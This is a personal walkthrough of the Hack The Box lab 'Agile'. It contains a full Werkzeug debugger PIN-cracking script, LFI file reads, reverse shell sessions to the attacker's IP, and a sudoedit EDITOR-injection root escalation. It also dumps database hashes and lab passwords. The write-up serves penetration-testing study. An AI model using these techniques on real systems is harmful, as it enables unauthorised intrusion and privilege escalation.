## Agile

### Lab Details 

- Difficulty: Medium
- Type: Web Enumeration, Werkzeug Debugger Abuse, Lateral Movement, Abusing Cron Jobs, Priv Esc, Linux

#### Enumeration
- run `nmap`
```bash
ORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 (ECDSA)
|_  256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://superpass.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
```
- no subdomain or useful files/directories on port 80
#### Initial Foothold 
- enumerate the application on port 80 and found that its vulnerable to `LFI`
![[Medium/Unix/Agile/LFI.png]]
- we can get `/etc/passwd` 
![[get error message.png]]
- get environment variables
![[get environment variable.png]]
- the application is prone to erroring out, its using `Wekzeug` as web server and we can try to use the build in terminal for RCE however we need the pin 
![[pin prompt.png]]
- use below script to get the pin, [details at](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html#werkzeug-console-pin-exploit)
```python
import hashlib
from itertools import chain
probably_public_bits = [
    'web3_user',  # /proc/self/environ
    'flask.app',  # its 'File "/app/venv/lib/python3.10/site-packages/flask/app.py", line 2528, in **wsgi_app**'
    'wsgi_app',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/app/venv/lib/python3.10/site-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
    # check /proc/net/arp to list all interfaces
    # then in python print(0x005056b9a62b)
    '345052390955',  # str(uuid.getnode()),  /sys/class/net/eth0/address
    'ed5b159560f54721827644bc9b220d00superpass.service'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```
- run the script
```bash
$ python3 getpin.py 
122-379-766
```
- enter the pin and enter a reverse shell 
```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.54] from (UNKNOWN) [10.129.25.12] 56624
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```
#### Lateral Movement (If any)
- look for database credentials on target and `mysql` connection string in `config_prod.json`
```bash
(venv) www-data@agile:/app$ cat config_prod.json 
{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}(venv) www-data@agile:/app$ 
```
- found login for user `corum`
```sql
mysql> select * from users;
+----+----------+--------------------------------------------------------------------------------------------------------------------------+
| id | username | hashed_password                                                                                                          |
+----+----------+--------------------------------------------------------------------------------------------------------------------------+
|  1 | 0xdf     | $6$rounds=200000$FRtvqJFfrU7DSyT7$8eGzz8Yk7vTVKudEiFBCL1T7O4bXl0.yJlzN0jp.q0choSIBfMqvxVIjdjzStZUYg6mSRB2Vep0qELyyr0fqF. |
|  2 | corum    | $6$rounds=200000$yRvGjY1MIzQelmMX$9273p66QtJQb9afrbAzugxVFaBhb9lyhp62cirpxJEOfmIlCy/LILzFxsyWj/mZwubzWylr3iaQ13e4zmfFfB1 |
|  9 | asd      | $6$rounds=200000$aEfPxxZj16Wb/4Oy$MmGqF2VtJaIswz9Idkkhsf1C4gWTjrw/tQYTkzNpfE3TPE0TwGgK6BEurqSmgfbXyQ9jX4b1wdHofSQ7N0QXU/ |
| 10 | 123      | $6$rounds=200000$QtZ.e5VO25dMowxZ$XPJljE2krGLYBCYjFchOwc6cP1XH0HdnLhovopCk0rlPmrjlL78wDkiOs9x14pg/ZS/P2HcueDsAuF7pOvrFX. |
+----+----------+--------------------------------------------------------------------------------------------------------------------------+
4 rows in set (0.00 sec)

mysql> select * from passwords
    -> ;
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
| id | created_date        | last_updated_data   | url            | username | password             | user_id |
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
|  3 | 2022-12-02 21:21:32 | 2022-12-02 21:21:32 | hackthebox.com | 0xdf     | 762b430d32eea2f12970 |       1 |
|  4 | 2022-12-02 21:22:55 | 2022-12-02 21:22:55 | mgoblog.com    | 0xdf     | 5b133f7a6a1c180646cb |       1 |
|  6 | 2022-12-02 21:24:44 | 2022-12-02 21:24:44 | mgoblog        | corum    | 47ed1e73c955de230a1d |       2 |
|  7 | 2022-12-02 21:25:15 | 2022-12-02 21:25:15 | ticketmaster   | corum    | 9799588839ed0f98c211 |       2 |
|  8 | 2022-12-02 21:25:27 | 2022-12-02 21:25:27 | agile          | corum    | 5db7caa1d13cc37c9fc2 |       2 |
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
```
- load and run `linpeas.sh`
![[internal port for test.png]]
- go to `chrome://inspect/#devices`
- click on `Configure` and add in the debugging port 
![[config chrome.png]]
- go to developer console and Application then in cookies 
![[inspecting test.png]]
- we are appeared to be logged into the application, go to vault and find `edwards` password
![[edwards password.png]]
- `ssh` into the target  using the found password
```
d07867c6267dcb5df0af
```

#### Privilege Escalation
- from the output of `nmap`
![[cronjob.png]]
- we see that `runner` is running a script `test_and_update.sh`
- in the script we see that its running `/app/venv/bin/activate` as a `cronjob`
- run `sudo -l`
```bash
edwards@agile:/app$ sudo -l
[sudo] password for edwards: 
Matching Defaults entries for edwards on agile:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
```
- we see that we can run `sudoedit` as `dev_admin` and we are able to edit `/app/venv/bin/activate` which is being executed by root
```
edwards@agile:/app$ ls -la /app/venv/bin/activate
-rw-rw-r-- 1 root dev_admin 1976 Sep 21 17:36 /app/venv/bin/activate
```
- we can add in a reverse shell in `/app/venv/bin/activate`
```bash
$ EDITOR="vim -- /app/venv/bin/activate" sudoedit -u dev_admin /app/app-testing/tests/functional/creds.txt
```
- wait for a minute and we get a reverse shell on `nc`
```bash
$ nc -lnvp 9002
listening on [any] 9002 ...
connect to [10.10.14.54] from (UNKNOWN) [10.129.25.12] 59388
bash: cannot set terminal process group (36705): Inappropriate ioctl for device
bash: no job control in this shell
bash: connect: Connection refused
bash: line 1: /dev/tcp/10.10.14.54/9002: Connection refused
root@agile:~# whoami
whoami
root
```
#### Resources

#### Lesson Learned
